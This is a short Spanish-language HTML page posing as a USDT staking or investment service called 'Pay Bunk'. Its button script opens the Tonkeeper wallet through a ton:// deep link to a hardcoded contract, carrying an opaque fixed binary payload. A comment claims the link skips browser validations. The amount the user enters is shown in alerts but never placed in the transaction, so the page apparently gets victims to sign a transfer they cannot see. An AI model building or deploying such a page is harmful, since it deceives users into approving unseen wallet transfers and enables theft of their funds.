<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Bunk Staking</title>
</head>
<body style="font-family: sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 40px 20px;">

    <div style="background: #1e293b; border-radius: 20px; padding: 30px; margin: auto; max-width: 380px; border: 1px solid #334155;">
        <h1>🚀 PAY BUNK</h1>
        <p style="color: #94a3b8;">Inversión libre en USDT</p>
        
        <div style="margin-bottom: 25px;">
            <label style="display: block; margin-bottom: 10px; color: #38bdf8;">Monto a invertir (USDT):</label>
            <input type="number" id="montoInput" placeholder="Ej: 1000" style="width: 80%; padding: 12px; border-radius: 10px; border: none; font-size: 18px; text-align: center; outline: none;">
        </div>

        <button onclick="enviarPagoDirecto()" style="background-color: #0088cc; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 90%; font-size: 18px;">
            INVERTIR AHORA
        </button>
        
        <p style="font-size: 12px; margin-top: 20px; color: #64748b;">Asegúrate de tener instalado Tonkeeper</p>
    </div>

    <script>
        function enviarPagoDirecto() {
            const monto = document.getElementById('montoInput').value;

            if (!monto || monto <= 0) {
                alert("Por favor, ingresa un monto válido.");
                return;
            }

            // DIRECCIONES Y CARGA (PAYLOAD)
            const contratoUSDT = "EQCxE6mAmikVmG_m_K_S8U6X3HC6_A9A6p79p6B_m4S6A6";
            // Este es el "mensaje" que le dice al contrato: envía los USDT a tu billetera
            const payload = "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA";
            
            // MONTO DE GAS EN TON (Aproximadamente 0.1 TON)
            const nanoTon = "100000000";

            // CREAMOS EL ENLACE "DEEP LINK" QUE ABRE LA BILLETERA DIRECTO
            // Esto salta todas las validaciones del navegador
            const url = "ton://transfer/" + contratoUSDT + "?amount=" + nanoTon + "&bin=" + payload;

            console.log("Abriendo billetera para " + monto + " USDT...");
            
            // Forzamos la apertura de Tonkeeper
            window.location.href = url;
            
            alert("Abriendo tu billetera... Confirma el envío de " + monto + " USDT.");
        }
    </script>
</body>
</html>
